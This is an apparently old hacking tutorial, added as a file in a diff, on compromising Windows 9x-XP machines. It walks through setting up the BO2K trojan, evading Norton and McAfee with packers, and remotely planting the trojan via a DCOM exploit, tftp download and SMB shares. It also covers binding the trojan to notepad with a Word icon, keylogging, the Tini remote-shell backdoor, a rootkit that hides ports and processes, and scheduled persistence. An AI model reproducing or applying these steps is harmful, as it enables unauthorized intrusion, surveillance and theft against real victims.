@@ -1,0 +1,577 @@
+HACKING WINDOWS
+~~~~~~~~~~~~~~~
+
+1.  INTRO
+    This paper describes how to hack Microsoft Windows 9x/ME/2000/XP and install
+backdoors. It also covers configuring bo2k server and client, Dsk Lite v.1,
+Tini Backdoor and how to bypass antivirus programs, and install a windows 
+rootkit.
+
+2.  THE TOOLS
+	All hacking needs to use tools. The hacking tools are all on the 
+Internet. 
+
+2.1  BO2K
+	This tool  is an Open Source remote administration tool and  is downloaded from:
+
+	http://www.bo2k.com
+
+You should download bo2k version 1.0 - since it is the stable release and also
+because it has the most number of plugins. Download all the plugins. The list
+of binaries you should download are:
+
+   a. bo2k_1.0.zip
+   b. cli_botool_1.0.zip
+   C. srv_bt2k_1-2.zip
+   d. srv_ricq_0-00.zip
+
+
+	
+2.1.1  bo2k_1.0.zip
+
+	This is the main program. After unzipping you will find the following
+files:
+
+   a.  bo2k.exe [DO NOT CLICK THIS - it is the server]
+   b.  bo2kgui.exe [The client manager part]
+   c.  bo2kcfg.exe [To configure bo2k.exe before deployment]
+   d.  bo_peep.dll [Plugin for remote desktop viewing/hijacking]
+
+
+Do not use the original bo2k.exe. Instead make a copy called sysdll.exe and
+use it instead. Use bo2kcfg.exe to open sysdll.exe. Set the port to 33333 or
+any unused port numbers between 1024 and insert the plugins below, except
+srv_ricq_0-00.zip, which doesn't work. Note that cli_botool is the client
+portion and as such such be inserted into bo2kgui.exe, by using bo2kgui.exe to
+insert. Click on the Configure... button on the Menubar and then Insert... 
+
+
+
+2.1.2  clt_botool.dll [cli_botool_1.0.zip]
+
+	This client-side plugin enables you to remotely manage the victim's 
+filesystem just like Windows Explorer. But more than that it enables you to 
+upload and download files as well.
+
+
+2.1.3   bo_peep.dll
+
+	This client and server plugin comes with the main bo2k package. Use
+bo2kcfg.exe to insert into sysdll.exe and bo2kgui.exe to insert into the
+client part.
+
+
+2.1.4   bt2k.dll [srv_bt2k_1-2.zip]
+
+	This server plugin enables the server to send you email once the victim 
+goes on the Internet.
+
+
+2.1.5    srv_ricq.dll [srv_ricq_0-00.zip]
+
+	This plugin informs you by icq messenger once the victim goes on the
+Internet. But for some unknown reason, it doesn't work. It actually sends the
+pager to wwp.icq.com.  But the server somehow never sends the pager.
+
+
+
+Note however, that Norton Antivirus, McAfee and probably many others classify bo2k
+as a trojan. 
+
+
+
+2.1.6		Stealth Option Variable
+
+Note that the trojan will still start on reboot if you had Enabled the 
+"Run at startup" in the "Stealth" Option Variable. However, do not enable 
+"Insidious" or "Hide Process" as this will cause it not to work on Win2000/XP.
+
+
+
+2.2	 NEOLITE VERSION 2
+
+[PED compressor is a much better alternative, see 8 below]
+
+This is the tool used to compress the bo2k server so that Antivirus programs
+can't detect bo2k. It is not a normal compressor like Winzip. Neolite can compress
+an exe program so that the program can still execute after compression. The
+compresed bo2k server program also runs faster. Compression upto about 50% is achieved, 
+ie, from 300 kB to 136 kB. The resulting smaller file makes it all the more
+faster to drop into the victim's machine. Neolite v.2 is downloaded from:
+
+	http://sac-ftp.externet.hu/pack12.html
+
+The binary is called:
+
+	neolte20.zip 
+
+and is described as a Windows 32-bit EXE and DLL compressor. But there is a
+catch.  Neolite v.2 is a trial version. In this trial version, the compressed
+bo2k server will popup a dialogue box to tell the victim that bo2k has been
+compressed with neolite - not very helpful. As such we need to download a
+crack for neolite. The crack will convert Neolite into a full version and
+will disable the popup dialog.
+ 
+
+	evc_nl20.zip
+
+which, when unzipped yields these files:
+
+	PATCH.COM
+	evc.nfo
+	file_id.diz
+
+Just copy all three into the same folder as neolite.exe. The, run PATCH.COM.
+A dos window will popup and inform you that neolite.exe has been successfully
+patched.  Thereafter, to use neolite, just execute the neolite.exe. A much
+better solution than te_loader.exe.
+Note that evc_nl20.zip is downloaded from:
+
+	www.bugs2k.com/n-03.html
+
+
+Note that the crack only works on WinME, it doesn't work on WinXP. On the latter
+it will yield an error message:  "Error initializing...". So you will need to modify
+your sysdll.exe trojan on an WinME PC. On, Win2000, use PED compressor, instead.
+
+
+After unzipping it, copy all its binaries and files to the same folder 
+where the original Neolite resides, usually:
+
+	C:\Program Files\NeoLite\
+
+The original binary is:
+
+	NeoLite.exe
+
+
+Once the dialog box opens, do not change any of the default, just click
+on Compress (the normal compress).
+
+
+	
+
+2.3   STEALTH TOOLS V.2 BY GOBO
+
+Stealth Tools version 2 is used to modify the trojan so as to avoid detection.
+It can be obtained from:
+
+	www.megasecurity.org/Tools/Stealthtools_all.html
+
+There are two versions, but both functions the same:
+
+	Stealthtools2.0.zip
+	Stealthtools2.0fe.zip
+
+
+
+3.   BYPASSING ANTIVIRUS
+
+The trojan bo2k dates back to 2000 and all Antivirus scanners are sure to
+have its signature. This section describes two antivirus scanners and how
+to bypass them.
+
+
+3.1   SYMANTEC NORTON ANTIVIRUS 2003
+
+Use Neolite v.2 to do a normal compress on sysdll.exe.
+Then do a scan using Norton. It will fail to detect the trojan.
+But, McAfee Virus Scan 2004 home edition can still detect it.
+
+
+3.2   MC AFEE VIRUS SCAN 2004 (HOME EDITION)
+
+Use Stealthtools v.2 to add 1000 bytes to sysdll.exe.
+Then use Neolite v.2 to do a normal compress.
+Then scan with Mc Afee. It will not be able to detect it any more
+but the trojan can still execute.
+
+	I also scanned it with McAfee Enterprise edition and it also
+could not detect the trojan.
+
+
+4.    PENETRATION AND INSERTION
+
+In this section we will look at how to insert sysdll.exe into a Target.
+
+
+4.1   INSERTION WITHOUT USER INTERVENTION
+
+Insertion strategies depends on whether it is Win9x/ME or WinXP.
+If it is Win9x/ME, and if C drive is shared, then insert into Startup Folder
+after connecting on the NetBIOS share. If the C:\ folder is NOT shared,
+then insert it in any folder that is shared which contains any .doc file.
+Recompile riched20.dll with Microsoft Visual C++  to tinclude the path to
+the sysdll.exe and copy riched20.dll to the same folder as sysdll.exe and 
+the .doc file. Whenever the user opens the .doc file, it will attach the 
+riched20.dll which is in the same folder as the .doc file. The trojanized 
+riched20.dll will then execute our sysdll.exe.
+
+
+If it is WinXP, then use dcom-rpc exploit to get C:\ shell, then ftp to
+drop site and download sysdll.exe, then directly execute it:
+
+	C:\WINDOW\system\sysdll.exe
+
+You can't do this in Win98/ME, because you do not have the shell when you
+connect via NetBIOS port 139. Also note that the trojanized riched20.dll doesn't 
+work on WinXP, although WinXP does have riched20.dll and riched32.dll.
+
+
+On Linux, the dcom exploit is called oc192-dcom.c and is easier to use, since
+you do not have to specify the Service Pack version of Win2000 or WinXP.
+
+
+An faster way is to use tftp on win200/XP:
+
+	C:\tftp -i 192.168.1.1 GET sysdll.exe C:\WINNT\sysdll.exe
+
+Then execute the trojan:
+
+	C:\WINNT\sysdll.exe
+
+Use your Linux server to run the tftpd server as follows.  Create a directory
+called /tftpboot and put sysdll.exe in it. Then start the tftpd server as follows:
+
+	chkconfig tftp on
+
+Then confirm with netstat:
+
+	netstat -uan
+
+You should see udp port 69.
+
+
+Note that the trojan will still start on reboot if you had Enabled the 
+"Run at startup" in the "Stealth" Option Variable. 
+
+
+It appears that the ISP's are blocking port 69 traffic, so tftp will not work on the
+Internet. On the LAN, it works like a charm. To solve this problem use netbios to
+share the victim's  C: drive instead. After exploiting with oc192-dcom.c exploit from
+a Linux box, you will get this terminal:
+
+	C:\
+
+Run this command:
+
+	C:\net share cdrive=C:\
+
+
+Then, open another xterm and connect with samba:
+
+	smbclient //VICTIM/cdrive -I 219.95.10.12
+
+assuming, for example that the target's name is VICTIM and its IP is as above.
+Then, 
+
+	smb: \>put sysdll.exe
+
+Go back to the other xterm where you had the dos shell and do this:
+
+	C:\sysdll.exe
+
+and connect with a bo2kgui client from a WinME box.
+
+
+
+To delete share later:
+
+	C:\net share /delete  
+
+
+You may find that the C:\ is non-writable although you may be able to connect.
+To solve this problem create a new share on SharedDocs which is the default
+share folder on WinXP:
+
+	net share myshare="C:\Documents and Settings\All Users\Documents"
+
+which, on WinXP is symbolically linked as SharedDocs.
+
+Then, use Netbrute to scan the target and open "myshare" created above.
+You could also use Linux's smbclient to connect:
+
+	smbclient //victim/myshare -I 219.95.2.3
+	smb: \>put sysdll.exe
+
+
+4.2    INSERTION WITH USER-INTERVENTION
+
+[Elitewrap also works on Windows 2000]
+
+
+This involves social engineering. We trick the user into executing the trojan.
+We pack a normal program eg, notepad.exe with sysdll.exe to produce another file,
+probably called textedit.exe.  When the user clicks on textedit.exe, notepad.exe will
+launch to open the notepad workspace but sysdll.exe will also run hidden.  To do that,
+we use elitewrap.exe.
+
+	C:\elitewrap
+	Enter name of output file: textedit.exe
+	Perform CRC checking: n
+      Enter package file #1: notepad.exe
+	Enter operation: 2    [Pack and execute,visible,asynchronously]
+	
+This means you wish to pack notepad.exe into textedit.exe and you want notepad.exe
+to execute when textedit.exe runs and you want it to be visible to the user.
+Asynchronously means concurrently, ie, independently from the second program
+sysdll.exe, which we will pack next.
+
+	Enter command line: <Enter>
+	Enter package file #2: sysdll.exe
+	Enter operation: 3   [Pack and execute, hidden, asynchronously]
+
+Note that we choose 3 this time, because we want it to execute hidden from the
+user's view when textedit.exe runs. Again, asynchronously, means concurrently with
+the first program notepad.exe, ie, do not wait for notepad.exe to complete.
+	
+	Enter command line: <Enter>
+	Enter package file #3: <Enter>
+	All done :)
+
+The trojan is now packed and is called textedit.exe.
+
+Next we need to replace the elitewrap icon with that of winword.exe
+Use iconedit.exe to extract winword.exe icon. Do this by opening winword.exe
+and extract and save as word.ico.  Then open the trojan textedit.exe with iconedit.exe
+and replace the elitewrap icon with that of the winword icon of size 32*32*4.
+Note that you could not use 48*48*8 icon to replace a 32*32*4 icon.
+ 
+
+Download Easy Icon Maker v. 3 from:
+
+	http://www.icon-editor.net/
+
+and the crack from:
+
+	http://crack.x-forum.info/ARCHIVE/X/XP+ICON.php
+
+Install Easy Icon Maker, then copy the crack program into the folder where iconmaker.exe
+is located. Then run the patch.
+
+
+
+5.    WINDOWS XP and WIN2000 KEYLOGGING
+
+All functions work without problems on Win98 and WinME.
+Somehow the Keylogging function doesn't work on WinXP, for bo2k version 1.0
+Alternatives:
+
+	Use latest version of bo2k (ie, devel version)
+	Use the keylogger i wrote
+	Download third party keylogger
+
+
+The bo2k keylogging function works on WIN2000.
+
+
+6.	TARGET ACQUISITION 
+
+Use netbrute.exe scanner to scan the pc's on the internet.  Check your IP first to
+determine which subnet you are in. Then scan that subnet. Netbrute.exe does runs very
+slow on WinXP. You should use it on WinME.
+
+
+7.  DSK LITE TROJAN v1.0
+
+Download from:
+
+	http://astalavista.com/trojans/remote-tools/
+
+The Client Program is DSK.exe. It is used to edit servers and also to connected to servers
+on infected machines. The default ports are 890 and 891.
+
+Click the "Edit Server" button and set as follows:
+
+a.  Main
+    Password: <your password>
+    Ports: 890 891
+    Vic Name: Cock Sucker
+
+b.  Start Up
+    Tick, Registry Run
+    Server Name: winlogon.exe
+    Registry Name: Windows Logon Application
+
+c.  Notify
+    Don't tick anything, we'll use bo2k's sysdll.exe	
+
+d.  Fake Error
+    Leave out
+
+e.  Misc
+    Leave out
+
+f.   Server Builder
+     Choose Build Server Unpacked (Large)
+     So that we can compress with Neolite later.
+     Then click "Build Server"
+
+Then name the server as sysdsk.exe
+
+Then compress it with Neolite using normal compress. No need to add
+white bytes using Stealth. 
+
+
+
+8.  PED COMPRESSOR
+
+Download from:
+
+	http://www.protools.cjb.net/
+
+PE Diminisher is a simple PE packer. Just run it, open the file you want to pack, 
+and select Encrypt File! Nice GUI. Using PED, no need Stealthtools by Gobo.
+Just open sysdll.exe and encrypt. It bypasses NOrton and MacAfee.
+
+
+Another advantage is that it runs on Win2000. The cracked Neolite doesn't.
+
+
+
+9.  ESS BINDER v.1.0
+
+Download from:
+
+	http://astalavista.com/trojans/utilities/
+
+Can wrap notepad.exe with sysdll.exe, etc.
+Works on Win2000.  Note, however, that the output exe has got no icons and
+therefore we can't change icons using Easy Icon Maker.
+
+
+10.   TINI BACKDOOR
+
+Download from:
+
+	http://ntsecurity.nu/toolbox/tini/
+
+No autostart upon reboot. To run, just execute it. Below is the FAQ from
+the website.
+
+What is Tini? 
+
+Tini is a simple and very small (3kb) backdoor for Windows, coded in assembler. It listens at TCP port 7777 and gives anybody who connects a remote Command Prompt. 
+
+How do I use this tool? 
+
+Download the exe file and run it. Connect (with an ordinary telnet client or similar) to TCP port 7777 and press Enter once, now you'll see the Command Prompt and be able to type commands. 
+
+Which OS's are supported? 
+
+Windows 95 / 98 / ME / NT 4.0 / 2000 / XP. 
+
+Tested on Win98 and Win2000.
+
+After encrypting with PED Compressor it is undetectable by Norton and Macafee.
+
+
+11.  AFX WINDOWS ROOTKIT 2003
+
+[Tested on WinXP aka WinNT 5.1]
+
+Hides files, processes, registries and ports.
+
+Note that we can't simply write a netstat.exe trojan  and place it in
+C:\winnt\system32, etc, because windows file protection system will
+simply replace it with the original copy. But a rootkit solves this problem.
+
+Downloaded as rootkit.zip from:
+ 
+
+windows rootkit works on win9x/ME/2000/XP
+
+
+Settings:
+Processes   - UMGR.EXE [the bo2k sysdll.exe's process]
+Files       - sysdll.exe
+              winmgt.exe
+              taskmgr.exe [ the rootkit ]
+              squid.exe
+        
+Registry    - UMGR.EXE
+Connections - *TCP*:33333*:*  [to hide sysdll.exe's UMGR.EXE]
+	      *TCP*:44444*:*  [to hide cmd.exe portbind]
+	      *TCP*:1028*:*   [to hide bo2k winmgt.exe]
+	      *TCP*:15151*:*  [bopeep vidstream] 
+	      *TCP*:14141*:*  [bopeep hijack]
+
+To avoid antivirus [tested against Norton AV], PED compression fails, in this case.
+
+Instead, use Gobo's Stealth tool to PACK and SCRAMBLE.
+
+
+
+12.  USING AT to RUN BACKDOOR
+
+Create a script called winmgt.bat as follows:
+
+copy con winmgt.bat
+@echo off
+echo ^G
+tiny.exe
+<ctrl-z>
+
+Then, schedule it to start at 11:00 am:
+
+   at 11:00 C:\winnt\winmgt.bat
+
+To check:
+
+   at
+
+To cancel:
+
+   at 1 /delete
+
+where 1 is the ID of the Task.
+
+
+To run the backdoor tini.exe everyday at 8 p.m. :
+
+
+   at 20:00 /every:M,Tu,W,Th,F,Sa,Su C:\winnt\winmgt.bat 
+
+
+
+More details on AT Task Scheduler:
+
+   http://www.winnetmag.com/Articles/Index.cfm?ArticleID=3131
+
+
+
+13.  IP FORWARDING
+
+To enable IP Forwarding on Windows 2000/XP, make the following
+registry change:
+
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
+]
+"IPEnableRouter"="1"
+
+For Windows 98/Me, make the following registry change instead:
+[HKEY LOCAL MACHINE\System\CurrentControlSet\Services\VxD\MSTCP]
+"EnableRouting"="1"
+
+Note: if the "IPEnableRouter" (or "EnableRouting") value does not yet
+exist under the aforementioned registry key, you will have to
+manually add it. Select 'New' from the 'Edit' menu and add a new
+DWORD value with the indicated name and value.
+
+
+14.  AUTOEXEC.BAT AND WIN.INI
+
+If a Win98 doesn't have a Startup folder, then, you could edit the 
+C:\autoexec.bat or C:\windows\win.ini files to start the trojan. But it
+won't work for WinME which will remove all those lines not related to
+the setting fo environment variables.
+ 
+In Win2000/XP, you edit these files instead:
+	\WINNT\System32\Autoexec.nt \WINNT\System32\Config.nt
+
+
+
+   
+
+
